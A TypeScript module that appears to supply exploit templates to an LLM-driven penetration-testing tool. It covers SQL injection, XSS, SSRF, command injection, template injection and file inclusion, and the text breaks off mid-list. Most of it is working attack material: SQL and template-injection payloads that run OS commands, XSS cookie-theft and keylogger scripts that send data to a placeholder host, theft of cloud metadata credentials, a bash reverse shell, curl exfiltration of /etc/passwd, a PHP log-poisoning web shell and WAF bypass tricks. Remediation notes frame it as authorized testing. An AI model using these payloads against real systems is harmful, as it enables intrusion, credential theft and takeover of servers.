/**
 * Vulnerability Class Templates (Gap 8)
 * ══════════════════════════════════════
 * Provides structured, methodology-driven exploit templates for each
 * vulnerability class. Each template includes:
 *   - Detection signals and indicators
 *   - Validation/confirmation logic
 *   - Payload strategies (not static payloads)
 *   - Escalation paths
 *   - Evidence capture requirements
 *   - OWASP WSTG mapping
 *   - ATT&CK technique mapping
 *
 * This replaces static payload lists with contextual exploit playbooks
 * that the LLM uses as reasoning frameworks.
 */

// ═══════════════════════════════════════════════════════════════════════
// §1 — TYPES
// ═══════════════════════════════════════════════════════════════════════

export interface ExploitTemplate {
  vulnClass: string;
  name: string;
  wstgIds: string[];
  attackTechniques: string[];
  cweIds: string[];
  detection: {
    signals: string[];
    indicators: string[];
    techniques: string[];
    falsePositives: string[];
  };
  validation: {
    confirmationSteps: string[];
    proofPayloads: string[];
    expectedResponses: string[];
    truePositiveMarkers: string[];
  };
  exploitation: {
    strategies: Array<{
      name: string;
      condition: string;
      approach: string;
      pattern: string;
      expectedOutcome: string;
    }>;
    environmentNotes: Record<string, string>;
    wafBypassNotes: string[];
    encodingNotes: string[];
  };
  escalation: {
    paths: Array<{
      name: string;
      description: string;
      requiredAccess: string;
      targetAccess: string;
      technique: string;
    }>;
    chainOpportunities: string[];
  };
  evidence: {
    requiredCaptures: string[];
    screenshots: string[];
    reportData: string[];
    fedRampNotes: string[];
  };
  remediation: string[];
  pitfalls: string[];
}

// ═══════════════════════════════════════════════════════════════════════
// §2 — TEMPLATE REGISTRY
// ═══════════════════════════════════════════════════════════════════════

export const VULN_TEMPLATES: Record<string, ExploitTemplate> = {

  // ─────────────────────────────────────────────────────────────────
  // SQL INJECTION
  // ─────────────────────────────────────────────────────────────────
  sqli: {
    vulnClass: 'sqli',
    name: 'SQL Injection',
    wstgIds: ['WSTG-INPV-05'],
    attackTechniques: ['T1190', 'T1059.004'],
    cweIds: ['CWE-89', 'CWE-564'],
    detection: {
      signals: [
        'Error messages containing SQL syntax (MySQL, PostgreSQL, MSSQL, Oracle, SQLite)',
        'Different response lengths/times for boolean conditions',
        'Numeric parameters that affect query logic',
        'Search/filter functionality with user input',
        'Login forms, user lookup, data retrieval endpoints',
      ],
      indicators: [
        'SQL error strings: "syntax error", "mysql_fetch", "pg_query", "ORA-", "SQLITE_ERROR"',
        'Stack traces revealing ORM/query builder usage',
        'Response time differences > 2s with time-based payloads',
        'Different HTTP status codes for true/false conditions',
      ],
      techniques: [
        'Single quote injection and error observation',
        'Boolean-based: AND 1=1 vs AND 1=2 response comparison',
        'Time-based: SLEEP/WAITFOR/pg_sleep injection',
        'UNION-based: ORDER BY column enumeration',
        'Error-based: extractvalue/updatexml for MySQL, CAST for MSSQL',
      ],
      falsePositives: [
        'WAF blocking with generic error page (not a SQL error)',
        'Application-level input validation returning custom errors',
        'Rate limiting causing different responses',
      ],
    },
    validation: {
      confirmationSteps: [
        'Inject single quote — observe SQL error or behavior change',
        'Test boolean conditions: param=1 AND 1=1 vs param=1 AND 1=2',
        'Test time-based: param=1 AND SLEEP(5) — observe 5s delay',
        'Test UNION: ORDER BY N (increment N until error to find column count)',
        'Confirm with second distinct payload to rule out coincidence',
      ],
      proofPayloads: [
        "' OR '1'='1' --",
        "1 AND 1=1 --",
        "1 AND 1=2 --",
        "1; SELECT SLEEP(5) --",
        "1 UNION SELECT NULL,NULL,NULL --",
      ],
      expectedResponses: [
        'Boolean true: normal response content/length',
        'Boolean false: different content/length or empty result',
        'Time-based: measurable delay matching injected sleep value',
        'UNION: response includes injected NULL columns or error revealing column count',
        'Error-based: SQL error message with database version or table info',
      ],
      truePositiveMarkers: [
        'Consistent boolean behavior across multiple tests',
        'Time delay precisely matches injected value',
        'Error messages contain actual SQL query fragments',
        'UNION injection returns data from other tables',
      ],
    },
    exploitation: {
      strategies: [
        {
          name: 'UNION-based extraction',
          condition: 'When output is reflected in response and column count is known',
          approach: 'Use UNION SELECT to extract data from information_schema, then target tables',
          pattern: 'UNION SELECT {column_list} FROM {table} WHERE {condition} --',
          expectedOutcome: 'Database contents extracted in response body',
        },
        {
          name: 'Boolean-blind extraction',
          condition: 'When no direct output but boolean differences observable',
          approach: 'Binary search through ASCII values using SUBSTRING and boolean conditions',
          pattern: "AND SUBSTRING((SELECT {column} FROM {table} LIMIT 1),{pos},1)='{char}' --",
          expectedOutcome: 'Character-by-character data extraction via response differences',
        },
        {
          name: 'Time-blind extraction',
          condition: 'When no visible output difference, only timing observable',
          approach: 'Use conditional time delays to extract data bit by bit',
          pattern: "AND IF(SUBSTRING((SELECT {column} FROM {table} LIMIT 1),{pos},1)='{char}',SLEEP(3),0) --",
          expectedOutcome: 'Data extracted via timing side-channel',
        },
        {
          name: 'Stacked queries (MSSQL/PostgreSQL)',
          condition: 'When database supports multiple statements',
          approach: 'Execute additional SQL statements for RCE or data manipulation',
          pattern: "; EXEC xp_cmdshell('{command}') -- (MSSQL) or ; COPY (SELECT '') TO PROGRAM '{command}' -- (PostgreSQL)",
          expectedOutcome: 'OS command execution via database',
        },
        {
          name: 'Out-of-band extraction',
          condition: 'When no in-band feedback available',
          approach: 'Use database-specific functions to make DNS/HTTP requests to attacker server',
          pattern: "LOAD_FILE(CONCAT('\\\\\\\\',({subquery}),'.{oob_domain}\\\\a')) (MySQL)",
          expectedOutcome: 'Data exfiltrated via DNS/HTTP to OOB server',
        },
      ],
      environmentNotes: {
        mysql: 'Use information_schema.tables/columns. GROUP_CONCAT for multi-row. LOAD_FILE/INTO OUTFILE for file ops.',
        postgresql: 'Use pg_catalog. COPY TO/FROM for file ops. PG_SLEEP for time-based.',
        mssql: 'Use INFORMATION_SCHEMA. xp_cmdshell for RCE. OPENROWSET for file read.',
        oracle: 'Use ALL_TABLES/ALL_TAB_COLUMNS. UTL_HTTP for OOB. DBMS_SCHEDULER for RCE.',
        sqlite: 'Limited to file-based ops. No network functions. ATTACH DATABASE for file write.',
      },
      wafBypassNotes: [
        'Case variation: SeLeCt, uNiOn',
        'Inline comments: UN/**/ION SE/**/LECT',
        'URL/double encoding',
        'MySQL comment syntax: /*!UNION*/ /*!SELECT*/',
        'Whitespace alternatives: %09, %0a, %0d, /**/',
        'Equivalent functions: MID() instead of SUBSTRING()',
      ],
      encodingNotes: [
        'URL-encode special characters in GET parameters',
        'Double-encode if WAF decodes once',
        'Hex encoding for string literals: 0x41646d696e instead of "Admin"',
        'CHAR() function to avoid quote filtering',
      ],
    },
    escalation: {
      paths: [
        { name: 'Data Exfiltration', description: 'Extract all database contents', requiredAccess: 'sqli', targetAccess: 'database_access', technique: 'UNION/blind extraction' },
        { name: 'Authentication Bypass', description: 'Login as any user', requiredAccess: 'sqli', targetAccess: 'service_account', technique: 'OR 1=1 or credential extraction' },
        { name: 'OS Command Execution', description: 'Execute OS commands via database', requiredAccess: 'sqli', targetAccess: 'command_execution', technique: 'xp_cmdshell/COPY TO PROGRAM/UDF' },
        { name: 'File Read/Write', description: 'Read/write files on database server', requiredAccess: 'sqli', targetAccess: 'file_write', technique: 'LOAD_FILE/INTO OUTFILE/COPY' },
      ],
      chainOpportunities: [
        'SQLi → credential extraction → lateral movement',
        'SQLi → file write → webshell → RCE',
        'SQLi → OS command → reverse shell → privilege escalation',
        'SQLi → admin credential → application admin → further exploitation',
      ],
    },
    evidence: {
      requiredCaptures: ['HTTP request with injection payload', 'HTTP response showing SQL error or data extraction', 'Database version string', 'Sample extracted data (redacted if sensitive)'],
      screenshots: ['SQL error page', 'Extracted data in response', 'Boolean difference comparison'],
      reportData: ['Injection point (parameter, method, endpoint)', 'Database type and version', 'Accessible tables/data', 'Impact assessment'],
      fedRampNotes: ['Document all accessed data categories', 'Note if PII/PHI was accessible', 'Record remediation timeline'],
    },
    remediation: [
      'Use parameterized queries / prepared statements',
      'Implement input validation with allowlists',
      'Apply least privilege to database accounts',
      'Enable WAF rules for SQL injection patterns',
      'Disable detailed error messages in production',
    ],
    pitfalls: [
      'Assuming WAF block means not vulnerable — test bypass techniques',
      'Only testing GET parameters — check POST, headers, cookies, JSON',
      'Missing second-order SQLi (stored input used in later query)',
      'Not testing all database types (syntax differs)',
    ],
  },

  // ─────────────────────────────────────────────────────────────────
  // CROSS-SITE SCRIPTING (XSS)
  // ─────────────────────────────────────────────────────────────────
  xss: {
    vulnClass: 'xss',
    name: 'Cross-Site Scripting',
    wstgIds: ['WSTG-INPV-01', 'WSTG-INPV-02'],
    attackTechniques: ['T1189', 'T1059.007'],
    cweIds: ['CWE-79'],
    detection: {
      signals: [
        'User input reflected in HTML response without encoding',
        'Search functionality echoing query terms',
        'Error messages including user input',
        'User-generated content (comments, profiles, messages)',
      ],
      indicators: [
        'Input reflected verbatim in response body',
        'HTML special characters not encoded',
        'Input placed inside HTML attributes, JavaScript, or CSS contexts',
        'DOM manipulation using URL fragment or query parameters',
      ],
      techniques: [
        'Inject unique string and search for it in response',
        'Test HTML context: <b>test</b>',
        'Test attribute context: " onmouseover="alert(1)',
        "Test JavaScript context: ';alert(1);//",
        'Test DOM-based: Check for document.location, innerHTML usage',
      ],
      falsePositives: [
        'Input reflected but properly HTML-encoded',
        'CSP blocking script execution',
        'WAF stripping payload but underlying vuln exists',
      ],
    },
    validation: {
      confirmationSteps: [
        'Inject unique canary string and find it in response',
        'Determine injection context (HTML body, attribute, JavaScript, URL)',
        'Test context-appropriate breakout payload',
        'Verify script execution with harmless proof',
        'Test with different browsers if DOM-based',
      ],
      proofPayloads: [
        '<img src=x onerror=alert(document.domain)>',
        '"><svg onload=alert(1)>',
        "'-alert(1)-'",
        '<details open ontoggle=alert(1)>',
      ],
      expectedResponses: [
        'Alert/console output showing document.domain',
        'OOB callback received from victim browser context',
        'DOM modification visible in page',
      ],
      truePositiveMarkers: [
        'JavaScript executes in browser context',
        'Can access document.cookie or document.domain',
        'Payload persists across page loads (stored XSS)',
      ],
    },
    exploitation: {
      strategies: [
        {
          name: 'Cookie theft',
          condition: 'When HttpOnly flag is not set on session cookies',
          approach: 'Inject script that sends document.cookie to attacker server',
          pattern: '<script>fetch("https://{oob}/c?"+document.cookie)</script>',
          expectedOutcome: 'Session cookie received at OOB server',
        },
        {
          name: 'Keylogging',
          condition: 'When targeting specific user actions',
          approach: 'Inject keylogger that captures form input',
          pattern: '<script>document.onkeypress=e=>fetch("https://{oob}/k?"+e.key)</script>',
          expectedOutcome: 'Keystroke data exfiltrated',
        },
        {
          name: 'CSRF via XSS',
          condition: 'When XSS is in authenticated context',
          approach: 'Use XSS to make authenticated requests on behalf of victim',
          pattern: '<script>fetch("/api/admin/action",{method:"POST",credentials:"include",body:JSON.stringify({...})})</script>',
          expectedOutcome: 'Privileged actions performed as victim user',
        },
      ],
      environmentNotes: {
        react: 'Auto-escapes JSX. Look for dangerouslySetInnerHTML, href="javascript:".',
        angular: 'Sanitizes by default. Look for bypassSecurityTrustHtml, innerHTML bindings.',
        vue: 'Escapes by default. Look for v-html directive.',
        jquery: '.html(), .append() with user input are common vectors.',
      },
      wafBypassNotes: [
        'Use event handlers: onerror, onload, onfocus, onmouseover',
        'Use SVG: <svg/onload=alert(1)>',
        'Use encoding: HTML entities or Unicode escapes',
        'Use polyglot payloads for multiple contexts',
        'Use mutation XSS (mXSS) for DOM-based bypasses',
      ],
      encodingNotes: [
        'HTML entity encoding for HTML context',
        'JavaScript Unicode escapes for JS context',
        'URL encoding for href/src attributes',
      ],
    },
    escalation: {
      paths: [
        { name: 'Session Hijacking', description: 'Steal session cookies', requiredAccess: 'xss', targetAccess: 'service_account', technique: 'Cookie theft' },
        { name: 'Account Takeover', description: 'Change password/email via CSRF', requiredAccess: 'xss', targetAccess: 'credential_access', technique: 'XSS-to-CSRF chain' },
        { name: 'Admin Escalation', description: 'Target admin users with stored XSS', requiredAccess: 'xss', targetAccess: 'command_execution', technique: 'Stored XSS in admin-viewed content' },
      ],
      chainOpportunities: [
        'XSS → session hijacking → account takeover',
        'XSS → CSRF → admin action execution',
        'Stored XSS → admin cookie theft → admin panel access → RCE',
      ],
    },
    evidence: {
      requiredCaptures: ['Injection point and context', 'Proof of JavaScript execution', 'Impact demonstration'],
      screenshots: ['XSS alert/popup', 'Browser console showing execution', 'OOB callback log'],
      reportData: ['XSS type (reflected, stored, DOM)', 'Injection context', 'CSP status', 'Cookie flags'],
      fedRampNotes: ['Document user data at risk', 'Note CSP implementation status'],
    },
    remediation: [
      'Implement context-aware output encoding',
      'Deploy Content Security Policy (CSP) with strict nonce/hash',
      'Set HttpOnly and Secure flags on session cookies',
      'Use modern frameworks with auto-escaping',
    ],
    pitfalls: [
      'Only testing <script>alert(1)</script> — use context-appropriate payloads',
      'Ignoring DOM-based XSS (requires JavaScript analysis)',
      'Assuming CSP prevents exploitation — CSP can often be bypassed',
      'Missing stored XSS in less-obvious locations',
    ],
  },

  // ─────────────────────────────────────────────────────────────────
  // SERVER-SIDE REQUEST FORGERY (SSRF)
  // ─────────────────────────────────────────────────────────────────
  ssrf: {
    vulnClass: 'ssrf',
    name: 'Server-Side Request Forgery',
    wstgIds: ['WSTG-INPV-19'],
    attackTechniques: ['T1090', 'T1071'],
    cweIds: ['CWE-918'],
    detection: {
      signals: [
        'URL parameters that fetch remote resources',
        'File import/export functionality',
        'Webhook configuration endpoints',
        'PDF/image generation from URLs',
        'API proxy or gateway endpoints',
      ],
      indicators: [
        'Server makes HTTP requests to user-supplied URLs',
        'Different error messages for reachable vs unreachable hosts',
        'Response time differences for internal vs external IPs',
      ],
      techniques: [
        'Supply external URL and check for OOB callback',
        'Supply internal IP (127.0.0.1, 10.x, 172.16.x) and observe response',
        'Test cloud metadata endpoints (169.254.169.254)',
        'Test different protocols (file://, gopher://, dict://)',
        'Test DNS rebinding for IP-based filters',
      ],
      falsePositives: [
        'Client-side redirects (not server-side)',
        'URL validation that blocks but still resolves DNS',
      ],
    },
    validation: {
      confirmationSteps: [
        'Send request to OOB server and confirm callback received',
        'Request internal service and observe different response',
        'Request cloud metadata and check for data',
        'Test protocol handlers: file:///etc/passwd, gopher://',
      ],
      proofPayloads: [
        'http://{oob_domain}/ssrf-proof',
        'http://127.0.0.1:80/',
        'http://169.254.169.254/latest/meta-data/',
        'http://[::1]:80/',
      ],
      expectedResponses: [
        'OOB callback from target server IP',
        'Internal service response content',
        'Cloud metadata (IAM role, instance ID)',
      ],
      truePositiveMarkers: [
        'OOB callback source IP matches target server',
        'Internal service data returned in response',
        'Cloud metadata accessible',
      ],
    },
    exploitation: {
      strategies: [
        {
          name: 'Cloud metadata extraction',
          condition: 'When target runs on AWS/GCP/Azure',
          approach: 'Access cloud metadata service to extract IAM credentials',
          pattern: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/{role_name}',
          expectedOutcome: 'AWS access keys, session tokens',
        },
        {
          name: 'Internal service scanning',
          condition: 'When SSRF allows port/host scanning',
          approach: 'Enumerate internal network services via response differences',
          pattern: 'http://10.0.0.{1-254}:{port}/',
          expectedOutcome: 'Map of internal services',
        },
        {
          name: 'Internal service exploitation',
          condition: 'When internal services found (Redis, Elasticsearch)',
          approach: 'Interact with unauthenticated internal services via SSRF',
          pattern: 'gopher://127.0.0.1:6379/_SET%20pwned%20true',
          expectedOutcome: 'Data extraction or command execution on internal services',
        },
        {
          name: 'File read via protocol handlers',
          condition: 'When file:// protocol is supported',
          approach: 'Read local files from the server filesystem',
          pattern: 'file:///etc/passwd or file:///proc/self/environ',
          expectedOutcome: 'Local file contents including credentials',
        },
      ],
      environmentNotes: {
        aws: 'IMDSv1: http://169.254.169.254/. IMDSv2 requires PUT with token header.',
        gcp: 'http://metadata.google.internal/ with Metadata-Flavor: Google header.',
        azure: 'http://169.254.169.254/metadata/instance with Metadata: true header.',
        kubernetes: 'Check https://kubernetes.default.svc for service account tokens.',
        docker: 'Check http://172.17.0.1:2375 for Docker API access.',
      },
      wafBypassNotes: [
        'IP encoding: 0x7f000001, 2130706433 for 127.0.0.1',
        'IPv6: [::1], [0:0:0:0:0:ffff:127.0.0.1]',
        'DNS rebinding to bypass IP-based filters',
        'URL shorteners or redirect chains',
        'Alternate protocols: gopher://, dict://',
        'Domain that resolves to internal IP',
      ],
      encodingNotes: [
        'URL-encode dots and slashes in IP addresses',
        'Decimal/hex/octal IP representations',
        'Use @ in URL: http://attacker@127.0.0.1/',
      ],
    },
    escalation: {
      paths: [
        { name: 'Cloud Account Takeover', description: 'Extract IAM credentials from metadata', requiredAccess: 'ssrf', targetAccess: 'credential_access', technique: 'Cloud metadata exploitation' },
        { name: 'Internal Network Pivot', description: 'Access internal services', requiredAccess: 'ssrf', targetAccess: 'database_access', technique: 'Internal service interaction' },
        { name: 'RCE via Internal Services', description: 'Execute commands via Redis/Elasticsearch', requiredAccess: 'ssrf', targetAccess: 'command_execution', technique: 'Gopher protocol to internal services' },
      ],
      chainOpportunities: [
        'SSRF → cloud metadata → IAM credential theft → full cloud access',
        'SSRF → internal Redis → Redis RCE → server shell',
        'SSRF → Kubernetes API → container escape → cluster takeover',
      ],
    },
    evidence: {
      requiredCaptures: ['SSRF request and response', 'OOB callback proof', 'Internal data accessed'],
      screenshots: ['OOB callback log', 'Internal service response', 'Cloud metadata response'],
      reportData: ['SSRF endpoint and parameter', 'Accessible internal services', 'Data at risk'],
      fedRampNotes: ['Document cloud credential exposure', 'Note internal network segmentation gaps'],
    },
    remediation: [
      'Implement allowlist of permitted destination hosts/IPs',
      'Block requests to private IP ranges and link-local addresses',
      'Use IMDSv2 (AWS) for token-based metadata access',
      'Disable unnecessary protocol handlers',
      'Validate and sanitize all user-supplied URLs',
    ],
    pitfalls: [
      'Only testing http:// — test file://, gopher://, dict://',
      'Assuming IP blocklist is sufficient — test encoding bypasses',
      'Missing blind SSRF — use OOB detection',
      'Not testing for DNS rebinding attacks',
    ],
  },

  // ─────────────────────────────────────────────────────────────────
  // COMMAND INJECTION
  // ─────────────────────────────────────────────────────────────────
  cmdi: {
    vulnClass: 'cmdi',
    name: 'OS Command Injection',
    wstgIds: ['WSTG-INPV-12'],
    attackTechniques: ['T1059', 'T1059.004'],
    cweIds: ['CWE-78', 'CWE-77'],
    detection: {
      signals: [
        'Parameters that interact with system operations (ping, traceroute, DNS)',
        'File operations (upload, download, conversion)',
        'System administration interfaces',
        'Diagnostic/health check endpoints',
      ],
      indicators: [
        'Response includes OS command output format',
        'Time-based: sleep injection causes delay',
        'Error messages revealing shell syntax',
        'Different behavior with shell metacharacters',
      ],
      techniques: [
        'Inject ; sleep 5 and measure response time',
        'Inject | id and look for uid= in response',
        'Inject $(whoami) or `whoami` in parameters',
        'Test blind with OOB: $(curl http://oob/)',
        'Test separators: ;, |, ||, &&, \\n, %0a',
      ],
      falsePositives: [
        'Application timeout (not caused by injected sleep)',
        'Input validation stripping metacharacters',
      ],
    },
    validation: {
      confirmationSteps: [
        'Inject time-based payload: ; sleep 5 — confirm delay',
        'Inject identity command: ; id — look for uid= output',
        'Inject OOB callback: ; curl http://oob/',
        'Test multiple separators',
      ],
      proofPayloads: [
        '; sleep 5',
        '| id',
        '$(whoami)',
        '`cat /etc/hostname`',
        '; curl http://{oob}/cmdi-proof',
      ],
      expectedResponses: [
        'Time delay matching injected sleep value',
        'uid=xxx(xxx) gid=xxx(xxx) in response',
        'OOB callback received from target IP',
      ],
      truePositiveMarkers: [
        'OS command output in response',
        'Precise time delay matching injection',
        'OOB callback from target server',
      ],
    },
    exploitation: {
      strategies: [
        {
          name: 'Direct command execution',
          condition: 'When command output is reflected in response',
          approach: 'Execute commands and read output directly',
          pattern: '; {command}',
          expectedOutcome: 'Full command output in response',
        },
        {
          name: 'Blind with OOB exfiltration',
          condition: 'When no output reflection available',
          approach: 'Exfiltrate data via DNS/HTTP OOB channels',
          pattern: '; curl http://{oob}/$(cat /etc/passwd | base64)',
          expectedOutcome: 'Data received at OOB server',
        },
        {
          name: 'Reverse shell',
          condition: 'When persistent access needed (authorized only)',
          approach: 'Establish reverse shell connection',
          pattern: '; bash -c "bash -i >& /dev/tcp/{attacker_ip}/{port} 0>&1"',
          expectedOutcome: 'Interactive shell on target system',
        },
      ],
      environmentNotes: {
        linux: 'Use bash, sh. Check /etc/passwd, /proc/self/environ. Find SUID.',
        windows: 'Use cmd.exe, powershell. Check whoami /all, net user, systeminfo.',
        docker: 'Check /.dockerenv, /proc/1/cgroup. Escape via mounted sockets.',
        php: 'system(), exec(), passthru(), shell_exec(). Check disable_functions.',
        nodejs: 'child_process.exec(), execSync(). Check for vm sandbox escape.',
      },
      wafBypassNotes: [
        'Use ${IFS} instead of spaces',
        'Use $() instead of backticks',
        'Hex encoding: $\'\\x63\\x61\\x74\' for "cat"',
        'Wildcard: /e?c/p?ss?d for /etc/passwd',
        'Variable concatenation: a=ca;b=t;$a$b /etc/passwd',
        'Newline injection: %0a instead of ;',
      ],
      encodingNotes: [
        'URL-encode metacharacters: %3B for ;, %7C for |',
        'Hex/octal encoding in shell',
        'Base64 encode commands: echo {b64} | base64 -d | bash',
      ],
    },
    escalation: {
      paths: [
        { name: 'Privilege Escalation', description: 'Escalate from web user to root', requiredAccess: 'command_execution', targetAccess: 'root_shell', technique: 'SUID/sudo/kernel exploit' },
        { name: 'Credential Harvesting', description: 'Extract credentials from config files', requiredAccess: 'command_execution', targetAccess: 'credential_access', technique: 'File read + grep for passwords' },
        { name: 'Lateral Movement', description: 'Pivot to other hosts', requiredAccess: 'command_execution', targetAccess: 'user_shell', technique: 'SSH with harvested creds' },
      ],
      chainOpportunities: [
        'CMDi → credential harvest → SSH to other hosts',
        'CMDi → reverse shell → privilege escalation → domain admin',
        'CMDi → Docker socket → container escape → host access',
      ],
    },
    evidence: {
      requiredCaptures: ['Injection payload and response', 'Command output (id, whoami, hostname)', 'OOB callback proof'],
      screenshots: ['Command output in response', 'Reverse shell session'],
      reportData: ['Injection point', 'OS and user context', 'Accessible data/systems'],
      fedRampNotes: ['Document system access level', 'Note data accessible from execution context'],
    },
    remediation: [
      'Avoid OS commands with user input — use language-native APIs',
      'Use parameterized execution (not string concatenation)',
      'Implement strict input validation with allowlists',
      'Run application with minimal OS privileges',
      'Use containerization to limit blast radius',
    ],
    pitfalls: [
      'Only testing ; separator — test |, ||, &&, \\n, backticks, $()',
      'Missing blind injection — always test with time-based and OOB',
      'Assuming Linux — target may be Windows',
      'Not testing all input vectors (headers, file names, JSON)',
    ],
  },

  // ─────────────────────────────────────────────────────────────────
  // SERVER-SIDE TEMPLATE INJECTION (SSTI)
  // ─────────────────────────────────────────────────────────────────
  ssti: {
    vulnClass: 'ssti',
    name: 'Server-Side Template Injection',
    wstgIds: ['WSTG-INPV-18'],
    attackTechniques: ['T1059', 'T1190'],
    cweIds: ['CWE-1336', 'CWE-94'],
    detection: {
      signals: [
        'User input rendered in templates (email, PDF, dynamic pages)',
        'Error messages revealing template engine syntax',
        'Mathematical expressions evaluated in output',
        'Custom greeting/notification templates',
      ],
      indicators: [
        '{{7*7}} returns 49',
        '${7*7} returns 49',
        '<%= 7*7 %> returns 49',
        'Template engine error messages',
      ],
      techniques: [
        'Inject {{7*7}} and check for 49',
        "Inject {{7*'7'}} — Jinja2 returns 7777777, Twig returns 49",
        'Inject ${7*7} for Java/Freemarker',
        'Use polyglot: ${{<%[%\'"}}%\\.',
      ],
      falsePositives: [
        'Client-side template rendering (Angular, Vue)',
        'Simple string interpolation without template engine',
      ],
    },
    validation: {
      confirmationSteps: [
        'Inject math expression and verify evaluation',
        'Identify template engine from error messages or behavior',
        'Test engine-specific object access',
        'Attempt to read environment variables or files',
      ],
      proofPayloads: [
        '{{7*7}}',
        '{{config.items()}}',
        "${T(java.lang.Runtime).getRuntime().exec('id')}",
        "{{''.__class__.__mro__[1].__subclasses__()}}",
      ],
      expectedResponses: [
        '49 in response (math evaluation)',
        'Config object contents (Jinja2)',
        'Command output (Java)',
      ],
      truePositiveMarkers: [
        'Server-side expression evaluation confirmed',
        'Can access server-side objects/classes',
        'Can read environment variables or files',
      ],
    },
    exploitation: {
      strategies: [
        {
          name: 'Jinja2 RCE (Python)',
          condition: 'When Jinja2 template engine detected',
          approach: 'Traverse Python MRO to access os.popen',
          pattern: "{{config.__class__.__init__.__globals__['os'].popen('{command}').read()}}",
          expectedOutcome: 'OS command output in response',
        },
        {
          name: 'Freemarker RCE (Java)',
          condition: 'When Freemarker template engine detected',
          approach: 'Use Java Runtime to execute commands',
          pattern: '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("{command}")}',
          expectedOutcome: 'OS command output in response',
        },
        {
          name: 'Twig RCE (PHP)',
          condition: 'When Twig template engine detected',
          approach: 'Use Twig filters to execute PHP functions',
          pattern: '{{["id"]|map("system")|join(",")}}',
          expectedOutcome: 'OS command output in response',
        },
        {
          name: 'ERB RCE (Ruby)',
          condition: 'When ERB template engine detected',
          approach: 'Use Ruby system() for command execution',
          pattern: '<%= system("{command}") %>',
          expectedOutcome: 'OS command output in response',
        },
      ],
      environmentNotes: {
        python_jinja2: 'Access via __class__.__mro__. Check for SandboxedEnvironment.',
        python_mako: 'Direct Python code execution via <% import os %>.',
        java_freemarker: 'Use Execute utility or ObjectConstructor.',
        php_twig: 'Use filter chains: map, sort, reduce with system/exec.',
        ruby_erb: 'Direct Ruby code execution in <% %> blocks.',
      },
      wafBypassNotes: [
        'Use alternate template syntax if primary is blocked',
        'String concatenation to build restricted keywords',
        'Attribute access via [] instead of . notation',
      ],
      encodingNotes: [
        'URL-encode template delimiters',
        'Use HTML entities inside template expressions',
        'Use string methods to construct payloads dynamically',
      ],
    },
    escalation: {
      paths: [
        { name: 'RCE via Template Engine', description: 'Execute OS commands', requiredAccess: 'ssti', targetAccess: 'command_execution', technique: 'Template engine native code execution' },
        { name: 'File Read', description: 'Read server files', requiredAccess: 'ssti', targetAccess: 'file_read', technique: 'Template file read functions' },
        { name: 'Config Extraction', description: 'Extract application configuration', requiredAccess: 'ssti', targetAccess: 'credential_access', technique: 'Access config/environment objects' },
      ],
      chainOpportunities: [
        'SSTI → RCE → reverse shell → privilege escalation',
        'SSTI → config extraction → database credentials → data exfiltration',
        'SSTI → file read → SSH keys → lateral movement',
      ],
    },
    evidence: {
      requiredCaptures: ['Template injection payload', 'Evaluated expression output', 'Template engine identification'],
      screenshots: ['Expression evaluation in response', 'Command output'],
      reportData: ['Template engine type and version', 'Injection context', 'Achievable access level'],
      fedRampNotes: ['Document code execution capability', 'Note data accessible from server context'],
    },
    remediation: [
      'Never pass user input directly into template rendering',
      'Use template engines in sandboxed mode',
      'Use logic-less templates (Mustache, Handlebars) when possible',
      'Separate template logic from user-controlled data',
    ],
    pitfalls: [
      'Only testing {{7*7}} — different engines use different syntax',
      'Missing blind SSTI — test with time-based or OOB',
      'Assuming sandbox prevents exploitation — many escapes exist',
      'Not identifying the specific template engine first',
    ],
  },

  // ─────────────────────────────────────────────────────────────────
  // PATH TRAVERSAL / LOCAL FILE INCLUSION
  // ─────────────────────────────────────────────────────────────────
  lfi: {
    vulnClass: 'lfi',
    name: 'Path Traversal / Local File Inclusion',
    wstgIds: ['WSTG-INPV-05', 'WSTG-ATHZ-01'],
    attackTechniques: ['T1083', 'T1005'],
    cweIds: ['CWE-22', 'CWE-98'],
    detection: {
      signals: [
        'File path parameters (file=, path=, page=, include=, template=)',
        'File download/view functionality',
        'Dynamic page inclusion',
        'Image/document serving endpoints',
      ],
      indicators: [
        'Different responses for existing vs non-existing files',
        'Error messages revealing file system paths',
        'Ability to traverse with ../ sequences',
      ],
      techniques: [
        'Inject ../../../etc/passwd and check for root: in response',
        'Test null byte injection: ../../../etc/passwd%00',
        'Test encoding: ..%2f..%2f..%2fetc%2fpasswd',
        'Test Windows paths: ..\\..\\..\\windows\\win.ini',
      ],
      falsePositives: [
        'Application returns custom 404 for all invalid paths',
        'Path normalization preventing traversal but not a vuln',
      ],
    },
    validation: {
      confirmationSteps: [
        'Inject ../../../etc/passwd and look for root:',
        'Try multiple traversal depths (3, 5, 8 levels)',
        'Test encoding bypasses if direct traversal blocked',
        'Confirm with a second known file (/etc/hostname)',
      ],
      proofPayloads: [
        '../../../etc/passwd',
        '....//....//....//etc/passwd',
        '..%252f..%252f..%252fetc%252fpasswd',
        '/proc/self/environ',
      ],
      expectedResponses: [
        'root:x:0:0: in response body',
        'Environment variables in response',
        'Known file content matching expected format',
      ],
      truePositiveMarkers: [
        'Can read files outside intended directory',
        'Multiple files readable consistently',
        'File content matches expected system files',
      ],
    },
    exploitation: {
      strategies: [
        {
          name: 'Sensitive file extraction',
          condition: 'When path traversal confirmed',
          approach: 'Read configuration files, credentials, source code',
          pattern: '../../../{target_file}',
          expectedOutcome: 'Credentials, API keys, database connection strings',
        },
        {
          name: 'LFI to RCE via log poisoning',
          condition: 'When log files are readable and writable via other channels',
          approach: 'Inject PHP code into access logs, then include the log file',
          pattern: 'User-Agent: <?php system($_GET["c"]); ?> then include=/var/log/apache2/access.log',
          expectedOutcome: 'Code execution via log file inclusion',
        },
        {
          name: 'LFI to RCE via PHP wrappers',
          condition: 'When PHP include() is used',
          approach: 'Use PHP stream wrappers for code execution',
          pattern: 'php://filter/convert.base64-encode/resource={file} or php://input with POST body',
          expectedOutcome: 'Source code disclosure or code execution',
        },
      ],
      environmentNotes: {
        linux: 'Target: /etc/passwd, /etc/shadow, /proc/self/environ, ~/.ssh/id_rsa, app config files.',
        windows: 'Target: C:\\Windows\\win.ini, C:\\Windows\\System32\\config\\SAM, web.config.',
        php: 'Use php:// wrappers. Check allow_url_include. Log poisoning via access logs.',
        java: 'Check WEB-INF/web.xml, application.properties, META-INF/MANIFEST.MF.',
        nodejs: 'Check package.json, .env, node_modules paths.',
      },
      wafBypassNotes: [
        'Double encoding: ..%252f..%252f',
        'Unicode encoding: ..%c0%af..%c0%af',
        'Null byte: %00 (older PHP versions)',
